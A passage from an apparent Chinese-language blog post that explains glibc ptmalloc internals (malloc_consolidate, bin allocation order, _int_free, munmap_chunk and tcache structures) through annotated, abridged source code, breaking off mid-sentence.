class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="comment">// 因为这里会release所有的fast bin，所以先把相应flag disable</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 两层循环</span></span><br><span class="line">  <span class="comment">// 1. 外层循环遍历所有fast bin</span></span><br><span class="line">  <span class="comment">// 2. 内层循环遍历bin中所有chunk</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 内层循环主要做了下面几件事，代码太长，略了</span></span><br><span class="line">        <span class="comment">// 1. 如果当前chunk的前一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 2. 如果当前chunk的后一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 3. 如果合并后的chunk不和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    将合并后的chunk插入到unsorted bin中</span></span><br><span class="line">        <span class="comment">// 4. 如果合并后的chunk和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    重新设置top chunk的起始位置</span></span><br><span class="line">      &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从unsorted-bin中分配"><a href="#尝试从unsorted-bin中分配" class="headerlink" title="尝试从unsorted bin中分配"></a><strong>尝试从unsorted bin中分配</strong></h3><p>这部分代码已经进入_int_malloc中最后那个最大的for循环了，这部分的工作在for循环的刚开始，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第一部分代码</span></span><br><span class="line">  <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line">    mchunkptr next = chunk_at_offset(victim, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 符合这四个条件的话，从last remainder chunk分配</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) </span><br><span class="line">        &amp;&amp; bck == unsorted_chunks(av) </span><br><span class="line">        &amp;&amp; victim == av-&gt;last_remainder </span><br><span class="line">        &amp;&amp; size &gt; (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line">    <span class="comment">// 正好遇到请求大小的chunk，分配成功</span></span><br><span class="line">    <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前chunk属于small bin的范围，将其放回small bin</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 当前chunk属于large bin的范围，将其放回large bin</span></span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从unsorted bin中删除当前chunk</span></span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断最大循环次数</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= <span class="number">10000</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从large-bin中分配"><a href="#尝试从large-bin中分配" class="headerlink" title="尝试从large bin中分配"></a>尝试从large bin中分配</h3><p>这是_int_malloc中最后那个大for循环的第二部分代码，在从unsorted bin分配失败之后，准备从large bin分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第二部分代码</span></span><br><span class="line">  <span class="comment">// 判断nb的大小，符合条件的话从large bin分配</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断前面得到的bin是否为空</span></span><br><span class="line">    <span class="comment">// 不为空的话最大的chunk size是否大于等于请求大小nb</span></span><br><span class="line">    victim = first(bin);</span><br><span class="line">    <span class="keyword">if</span> (victim != bin &amp;&amp; chunksize_nomask(victim) &gt;= nb) &#123;</span><br><span class="line">      <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">      <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">      <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">      <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在请求大小nb所在的bin分配失败，继续从后面的bin来分配，</span></span><br><span class="line">  <span class="comment">// 在查找后面bin的过程中，会用到binmap来加快查找速度</span></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  block = idx2block(idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 如果后面没有找到合适的bin，就跳到use_top使用top chunk来分配</span></span><br><span class="line">    <span class="comment">// 如果后面找到了合适的bin，那么：</span></span><br><span class="line">    <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">    <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">    <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">    <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从top-chunk中分配"><a href="#尝试从top-chunk中分配" class="headerlink" title="尝试从top chunk中分配"></a>尝试从top chunk中分配</h3><p>这是_int_malloc中最后那个大for循环的第三部分代码，在从large bin分配失败之后，准备从top chunk分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第三部分代码</span></span><br><span class="line">  <span class="comment">// 前面都分配失败，从top chunk分配</span></span><br><span class="line">use_top:</span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">// top chunk的大小如果满足要求，分配成功</span></span><br><span class="line">    <span class="comment">// 剩余的部分成为新的top chunk，同时也会成为remainder</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, ...);</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (av-&gt;have_fastchunks) &#123;</span><br><span class="line">    <span class="comment">// 如果fast bin flag被设置，</span></span><br><span class="line">    <span class="comment">// 再重新release fast bin的内容到unsorted bin中，</span></span><br><span class="line">    <span class="comment">// 并且重新得到请求大小所在bin的index</span></span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果top chunk也不满足请求大小，</span></span><br><span class="line">    <span class="comment">// 就使用系统调用增加top chunk，或者再开辟出一块heap</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="free入口"><a href="#free入口" class="headerlink" title="free入口"></a>free入口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = </span><br><span class="line">        atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// part3</span></span><br><span class="line">  mchunkptr p = mem2chunk(mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mstate ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码分成了part1/2/3三部分：</p><ul><li>part1：调用回调函数，追代码可以发现，这个回调函数为NULL</li><li>part2：允许free(0)这样的调用，即什么都不做，直接返回</li><li>part3：判断所释放的空间是不是使用mmap分配得到的，如果是mmap分配得到的，就使用munmap来释放，如果不是的话，就调用_int_free这个主释放函数来释放，后面就来重点分析这个函数</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>先贴流程</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161840.png" alt=""></p><p>根据上图，free时先是判断chunk size是不是处在fast bin的范围，是的话就把该chunk放入fast bin中，把chunk放入fast bin的操作是一个CAS操作.</p><p>通过代码实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &lt;= get_max_fast()) &#123;</span><br><span class="line">  free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">  fb = &amp;fastbin (av, idx);</span><br><span class="line">  <span class="comment">// Atomically link P to its fastbin: </span></span><br><span class="line">  <span class="comment">// P-&gt;FD = *FB; *FB = P;</span></span><br><span class="line">  mchunkptr old = *fb, old2;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    old2 = old;</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((old = </span><br><span class="line">    catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码除了前面提到的CAS操作，还有两个点值得注意一下：</p><ul><li>使用free<em>perturb函数来改变一下所释放空间的原来内容，这个要在设置了glibc.malloc.perturb或者MALLOC_PERTURB</em>环境变量的时候才会起作用</li><li>PROTECT_PTR的底层原理实际上是一种safe-linking的安全机制，它利用了ASLR（地址空间布局随机化）中的随机性，可以很有效的防止UAF漏洞，这部分很有意思，黑客的入门题，以后有时间再专门写篇文章研究下，这里只简单提下</li></ul><p>如果chunk size不属于fast bin的范围，继续判断是不是由mmap分配产生，如果由mmap分配产生，则使用munmap_chunk这个函数来进行free，munmap_chunk的主要代码也一并列在了下面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 如果空间是由mmap分配的，则使用munmap_chunk释放</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// munmap_chunk的主要实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span> &#123;</span><br><span class="line">  <span class="comment">// GLRO是一个字符串连接宏，这里把dl_pagesize</span></span><br><span class="line">  <span class="comment">// 变成了_dl_pagesize，_dl_pagesize的值是4096</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>)chunk2mem(p);</span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>)p - prev_size(p);</span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size(p) + size;</span><br><span class="line">  <span class="comment">// 通过下面这个check可以发现，mmap分配的</span></span><br><span class="line">  <span class="comment">// 空间地址和大小都必须是pagesize的倍数</span></span><br><span class="line">  <span class="keyword">if</span> (((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span> ||</span><br><span class="line">      (!powerof2(mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  <span class="type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 继续调用__munmap来进行释放，</span></span><br><span class="line">  <span class="comment">// 追踪代码可以看到是由_vm_deallocate释放的空间</span></span><br><span class="line">  __munmap((<span class="type">char</span> *)block, total_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个判断的原理很简单，都知道malloc的chunk header中有A、M、P 3个bit的flag，其中的M就是表示该chunk是不是由mmap系统调用产生，这个判断宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>如果chunk不是由mmap分配，先判断该chunk的prev chunk是不是free state，如果是的话，需要和prev chunk进行merge：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再判断next chunk是不是top chunk，是的话，重新设置top chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (nextchunk == av-&gt;top) &#123;</span><br><span class="line">  ize += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果next chunk不是top chunk，有两种情况，如果是free state的话，则继续merge，如果是allocated state的话，则改变其P(PREV_INUSE) flag，最后把要free的chunk放入unsorted bin中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  unlink_chunk (av, nextchunk);</span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">// not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">// been given one chance to be used in malloc.</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>最后还要看下merge过后的chunk size是否达到FASTBIN_CONSOLIDATION_THRESHOLD这个阈值（默认大小是65536），达到的话要做一次malloc_consolidate操作（free fast bin中的chunk到unsorted bin中），对非main arena还要做一下heap_trim操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">  <span class="keyword">if</span> (av =!&amp;main_arena) &#123;</span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中的heap_for_ptr这个宏是用来得到当前heap的heap_info的，从它的定义可以验证heap_info这个数据结构的一些特性，值得看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr)                      \</span></span><br><span class="line"><span class="meta">  ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><h1 id="有tcache"><a href="#有tcache" class="headerlink" title="有tcache"></a>有tcache</h1><p>以上都是不考虑tcache的情况（libc&lt;2.26)，有tcache其实变化也并不是太大。</p><p>相关数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcache也是使用 类似 bins 方式来管理tcache 。</p><p><strong>tcache_perthread_struct是整个tcache</strong></p><p>每一项由 相同大小的 chunk 通过 tcache_entry 使用单向链表链接（类似于fastbin的链接方式）。</p><p><strong>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</strong></p><p>tcache_entry 用于链接 chunk 的结构体， 其中就只有一个 next 指针，指向下一个相同大小的 chunk.,也就说明tcache链上的成员只记录了fd指针</p><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这段代码能更好地理解上面两个结构体.</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 chunk 放到 指定的 tcache-&gt;entries 里面去， tc_idx 通过 csize2tidx (nb) 计算得到 （nb是 chunk 的大小）。</p><p>它首先把 chunk+2<em>SIZE_SZ （就是除去 header 部分） 